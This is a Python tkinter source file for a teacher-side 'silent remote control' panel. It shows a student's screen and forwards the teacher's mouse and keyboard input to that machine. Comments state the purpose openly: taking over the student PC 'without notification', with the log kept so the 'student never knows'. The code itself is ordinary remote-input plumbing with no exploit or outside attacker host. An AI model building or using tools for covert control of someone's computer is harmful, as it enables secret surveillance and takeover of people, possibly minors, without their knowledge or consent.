# remote_control_panel.py - SILENT REMOTE CONTROL (TEACHER SIDE)
# Complete control panel for taking over student PC without notification

import tkinter as tk
from tkinter import ttk
import threading
import time
import queue
import state
import screen_dashboard

class RemoteControlPanel:
    def __init__(self, parent, student_ip, student_name, dashboard_ref):
        self.parent = parent
        self.student_ip = student_ip
        self.student_name = student_name
        self.dashboard = dashboard_ref
        self.window = None
        
        # Control state
        self.controlling = False
        self.last_mouse_position = None
        self.mouse_tracking = False
        
        # Screen display
        self.screen_label = None
        self.photo_image = None
        
        # Event queue for UI thread
        self.ui_queue = queue.Queue()
        
        # Virtual key code mapping
        self.vk_map = self._create_vk_map()
        
    def show(self):
        """Show remote control panel"""
        if self.window and self.window.winfo_exists():
            self.window.lift()
            self.window.focus_force()
            return
            
        self.window = tk.Toplevel(self.parent)
        self.window.title(f"🔍 REMOTE CONTROL - {self.student_name} ({self.student_ip})")
        self.window.geometry("1200x800")
        self.window.resizable(True, True)
        
        # Make it always on top
        self.window.attributes('-topmost', True)
        
        # Configure window
        self.window.protocol("WM_DELETE_WINDOW", self.close)
        
        # Main container
        main_frame = ttk.Frame(self.window, padding=10)
        main_frame.pack(fill="both", expand=True)
        
        # Header with controls
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill="x", pady=(0, 10))
        
        # Title and status
        title_frame = ttk.Frame(header_frame)
        title_frame.pack(side="left", fill="x", expand=True)
        
        ttk.Label(title_frame, 
                 text=f"🎮 REMOTE CONTROL ACTIVE", 
                 font=("Arial", 14, "bold"),
                 foreground="red").pack(anchor="w")
        
        self.status_var = tk.StringVar(value=f"Controlling: {self.student_name}")
        ttk.Label(title_frame, textvariable=self.status_var,
                 font=("Arial", 10)).pack(anchor="w")
        
        # Control buttons
        btn_frame = ttk.Frame(header_frame)
        btn_frame.pack(side="right")
        
        # Emergency stop button
        self.stop_btn = ttk.Button(btn_frame, text="⛔ RELEASE CONTROL", 
                                  command=self.release_control,
                                  style="Danger.TButton")
        self.stop_btn.pack(side="left", padx=5)
        
        # Refresh button
        ttk.Button(btn_frame, text="🔄 Refresh Screen", 
                  command=self.refresh_screen,
                  width=15).pack(side="left", padx=5)
        
        # Fullscreen toggle
        self.fullscreen_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(btn_frame, text="Fullscreen", 
                       variable=self.fullscreen_var,
                       command=self.toggle_fullscreen).pack(side="left", padx=5)
        
        # Mouse tracking toggle
        self.tracking_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(btn_frame, text="Track Mouse", 
                       variable=self.tracking_var).pack(side="left", padx=5)
        
        # Screen display area
        display_frame = ttk.LabelFrame(main_frame, text="Student Screen", padding=5)
        display_frame.pack(fill="both", expand=True)
        
        # Create canvas with scrollbars for large screens
        canvas_frame = ttk.Frame(display_frame)
        canvas_frame.pack(fill="both", expand=True)
        
        h_scroll = ttk.Scrollbar(canvas_frame, orient="horizontal")
        v_scroll = ttk.Scrollbar(canvas_frame, orient="vertical")
        
        self.canvas = tk.Canvas(canvas_frame, bg="black",
                               xscrollcommand=h_scroll.set,
                               yscrollcommand=v_scroll.set)
        
        h_scroll.config(command=self.canvas.xview)
        v_scroll.config(command=self.canvas.yview)
        
        h_scroll.pack(side="bottom", fill="x")
        v_scroll.pack(side="right", fill="y")
        self.canvas.pack(side="left", fill="both", expand=True)
        
        # Screen label inside canvas
        self.screen_label = tk.Label(self.canvas, bg="black", 
                                    text="Waiting for screen stream...",
                                    fg="white", font=("Arial", 16))
        self.canvas.create_window((0, 0), window=self.screen_label, anchor="nw")
        
        # Status bar
        status_frame = ttk.Frame(main_frame)
        status_frame.pack(fill="x", pady=(10, 0))
        
        self.mouse_pos_var = tk.StringVar(value="Mouse: (0, 0)")
        ttk.Label(status_frame, textvariable=self.mouse_pos_var,
                 font=("Arial", 9)).pack(side="left", padx=10)
        
        self.last_action_var = tk.StringVar(value="Last Action: None")
        ttk.Label(status_frame, textvariable=self.last_action_var,
                 font=("Arial", 9)).pack(side="left", padx=10)
        
        # Bind mouse and keyboard events
        self.bind_control_events()
        
        # Start remote control
        self.start_control()
        
        # Start UI update thread
        self.running = True
        self.ui_thread = threading.Thread(target=self._ui_update_loop, daemon=True)
        self.ui_thread.start()
        
        # Center window
        self.center_window()
        
    def _create_vk_map(self):
        """Create virtual key code mapping"""
        vk = {
            'backspace': 0x08, 'tab': 0x09, 'enter': 0x0D, 'shift': 0x10,
            'ctrl': 0x11, 'alt': 0x12, 'pause': 0x13, 'capslock': 0x14,
            'escape': 0x1B, 'space': 0x20, 'pageup': 0x21, 'pagedown': 0x22,
            'end': 0x23, 'home': 0x24, 'left': 0x25, 'up': 0x26,
            'right': 0x27, 'down': 0x28, 'printscreen': 0x2C, 'insert': 0x2D,
            'delete': 0x2E, '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33,
            '4': 0x34, '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,
            'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45, 'f': 0x46,
            'g': 0x47, 'h': 0x48, 'i': 0x49, 'j': 0x4A, 'k': 0x4B, 'l': 0x4C,
            'm': 0x4D, 'n': 0x4E, 'o': 0x4F, 'p': 0x50, 'q': 0x51, 'r': 0x52,
            's': 0x53, 't': 0x54, 'u': 0x55, 'v': 0x56, 'w': 0x57, 'x': 0x58,
            'y': 0x59, 'z': 0x5A, 'f1': 0x70, 'f2': 0x71, 'f3': 0x72, 'f4': 0x73,
            'f5': 0x74, 'f6': 0x75, 'f7': 0x76, 'f8': 0x77, 'f9': 0x78,
            'f10': 0x79, 'f11': 0x7A, 'f12': 0x7B, 'numlock': 0x90,
            'scrolllock': 0x91, 'lshift': 0xA0, 'rshift': 0xA1,
            'lctrl': 0xA2, 'rctrl': 0xA3, 'lalt': 0xA4, 'ralt': 0xA5,
            ';': 0xBA, '=': 0xBB, ',': 0xBC, '-': 0xBD, '.': 0xBE,
            '/': 0xBF, '`': 0xC0, '[': 0xDB, '\\': 0xDC, ']': 0xDD, "'": 0xDE
        }
        return vk
        
    def bind_control_events(self):
        """Bind mouse and keyboard events for remote control"""
        # Mouse movement tracking
        self.screen_label.bind('<Motion>', self.on_mouse_move)
        self.screen_label.bind('<Button-1>', self.on_mouse_click)
        self.screen_label.bind('<ButtonRelease-1>', self.on_mouse_release)
        self.screen_label.bind('<Button-3>', self.on_right_click)
        self.screen_label.bind('<ButtonRelease-3>', self.on_right_release)
        self.screen_label.bind('<MouseWheel>', self.on_mouse_wheel)
        self.screen_label.bind('<Button-4>', self.on_mouse_wheel)  # Linux
        self.screen_label.bind('<Button-5>', self.on_mouse_wheel)  # Linux
        
        # Keyboard events (bind to window)
        self.window.bind('<Key>', self.on_key_press)
        self.window.bind('<KeyRelease>', self.on_key_release)
        
        # Set focus for keyboard
        self.screen_label.focus_set()
        
    def start_control(self):
        """Start remote control session"""
        # Send command to student to start remote control
        state.send_command(f"REMOTE_CONTROL:START")
        
        # Request screen stream if not already streaming
        if self.student_ip not in self.dashboard.active_streams:
            self.dashboard.start_stream(self.student_ip)
        
        self.controlling = True
        self.status_var.set(f"Controlling: {self.student_name} (ACTIVE)")
        
        # Log in teacher GUI only (student never knows)
        state.add_log(f"Teacher | Remote control started for {self.student_name}")
        
    def release_control(self):
        """Release remote control"""
        if self.controlling:
            # Send stop command to student
            state.send_command(f"REMOTE_CONTROL:STOP")
            
            self.controlling = False
            self.status_var.set(f"Controlling: {self.student_name} (RELEASED)")
            
            state.add_log(f"Teacher | Remote control released for {self.student_name}")
            
    def close(self):
        """Close panel and release control"""
        self.release_control()
        self.running = False
        if self.window:
            self.window.destroy()
            self.window = None
            
    def on_mouse_move(self, event):
        """Handle mouse movement - SEND TO STUDENT"""
        if not self.controlling or not self.tracking_var.get():
            return
            
        # Get actual coordinates on the image
        x = event.x
        y = event.y
        
        # Get image dimensions
        if self.screen_label.image:
            img_width = self.screen_label.image.width()
            img_height = self.screen_label.image.height()
            
            # Scale to student's screen resolution (assume 1920x1080)
            # We need to scale from displayed image size to actual screen size
            # This is approximate - for precise control we'd need student's actual resolution
            scale_x = 1920 / img_width
            scale_y = 1080 / img_height
            
            student_x = int(x * scale_x)
            student_y = int(y * scale_y)
            
            # Send mouse move command
            command = f"REMOTE_INPUT:mouse_move|{student_x}|{student_y}"
            state.send_command(command)
            
            # Update UI
            self.mouse_pos_var.set(f"Mouse: ({student_x}, {student_y})")
            self.last_action_var.set(f"Last Action: Move to ({student_x}, {student_y})")
            
    def on_mouse_click(self, event):
        """Handle left mouse down"""
        if not self.controlling:
            return
            
        command = f"REMOTE_INPUT:mouse_click|left|1"
        state.send_command(command)
        self.last_action_var.set("Last Action: Left Click DOWN")
        
    def on_mouse_release(self, event):
        """Handle left mouse up"""
        if not self.controlling:
            return
            
        command = f"REMOTE_INPUT:mouse_click|left|0"
        state.send_command(command)
        self.last_action_var.set("Last Action: Left Click UP")
        
    def on_right_click(self, event):
        """Handle right mouse down"""
        if not self.controlling:
            return
            
        command = f"REMOTE_INPUT:mouse_click|right|1"
        state.send_command(command)
        self.last_action_var.set("Last Action: Right Click DOWN")
        
    def on_right_release(self, event):
        """Handle right mouse up"""
        if not self.controlling:
            return
            
        command = f"REMOTE_INPUT:mouse_click|right|0"
        state.send_command(command)
        self.last_action_var.set("Last Action: Right Click UP")
        
    def on_mouse_wheel(self, event):
        """Handle mouse wheel"""
        if not self.controlling:
            return
            
        # Windows: event.delta, Linux: event.num
        if event.delta:
            delta = event.delta
        elif event.num == 4:
            delta = 120
        elif event.num == 5:
            delta = -120
        else:
            delta = 0
            
        command = f"REMOTE_INPUT:mouse_wheel|{delta}"
        state.send_command(command)
        self.last_action_var.set(f"Last Action: Wheel {delta}")
        
    def on_key_press(self, event):
        """Handle key press"""
        if not self.controlling:
            return
            
        # Don't send modifier keys that would affect teacher's system
        if event.keysym in ('Control_L', 'Control_R', 'Alt_L', 'Alt_R', 
                           'Super_L', 'Super_R', 'Shift_L', 'Shift_R'):
            return
            
        # Try to get virtual key code
        vk_code = self.vk_map.get(event.keysym.lower())
        
        if vk_code:
            # Send key down
            command = f"REMOTE_INPUT:key|{vk_code}|1"
            state.send_command(command)
            
            # For regular characters, also send char event
            if len(event.char) == 1 and event.char.isprintable():
                char_command = f"REMOTE_INPUT:key_char|{event.char}"
                state.send_command(char_command)
                
            self.last_action_var.set(f"Last Action: Key [{event.keysym}] DOWN")
            
    def on_key_release(self, event):
        """Handle key release"""
        if not self.controlling:
            return
            
        vk_code = self.vk_map.get(event.keysym.lower())
        
        if vk_code:
            command = f"REMOTE_INPUT:key|{vk_code}|0"
            state.send_command(command)
            self.last_action_var.set(f"Last Action: Key [{event.keysym}] UP")
            
    def refresh_screen(self):
        """Request screen refresh"""
        if self.student_ip:
            state.send_command(f"REFRESH_SCREEN:{self.student_ip}")
            self.last_action_var.set("Last Action: Refresh requested")
            
    def toggle_fullscreen(self):
        """Toggle fullscreen mode"""
        is_fullscreen = self.fullscreen_var.get()
        self.window.attributes('-fullscreen', is_fullscreen)
        
        if is_fullscreen:
            self.window.bind('<Escape>', lambda e: self.fullscreen_var.set(False))
            
    def update_screen(self, image_data):
        """Update screen display with new image from student"""
        try:
            from PIL import Image, ImageTk
            import io
            
            # Convert bytes to PIL Image
            image = Image.open(io.BytesIO(image_data))
            
            # Get current canvas size
            canvas_width = self.canvas.winfo_width()
            canvas_height = self.canvas.winfo_height()
            
            if canvas_width > 10 and canvas_height > 10:
                # Resize to fit canvas while maintaining aspect ratio
                image.thumbnail((canvas_width - 20, canvas_height - 20), 
                              Image.Resampling.LANCZOS)
                
                # Convert to PhotoImage
                photo = ImageTk.PhotoImage(image)
                
                # Update label
                self.screen_label.config(image=photo, text="")
                self.screen_label.image = photo
                self.photo_image = photo
                
                # Update canvas scroll region
                self.canvas.configure(scrollregion=(0, 0, image.width, image.height))
                
        except Exception as e:
            self.status_var.set(f"Error: {str(e)[:50]}")
            
    def _ui_update_loop(self):
        """Update UI from queue (thread-safe)"""
        while self.running:
            try:
                # Check for new screen images from dashboard
                if self.student_ip in self.dashboard.image_queues:
                    try:
                        image_data = self.dashboard.image_queues[self.student_ip].get_nowait()
                        # Schedule UI update in main thread
                        if self.window and self.window.winfo_exists():
                            self.window.after(0, lambda d=image_data: self.update_screen(d))
                    except queue.Empty:
                        pass
                        
                time.sleep(0.05)
                
            except Exception:
                pass
                
    def center_window(self):
        """Center window on screen"""
        self.window.update_idletasks()
        width = self.window.winfo_width()
        height = self.window.winfo_height()
        x = (self.window.winfo_screenwidth() // 2) - (width // 2)
        y = (self.window.winfo_screenheight() // 2) - (height // 2)
        self.window.geometry(f'{width}x{height}+{x}+{y}')


# Create style for danger button
def setup_styles():
    """Setup custom button styles"""
    style = ttk.Style()
    style.configure("Danger.TButton", foreground="red", font=("Arial", 10, "bold"))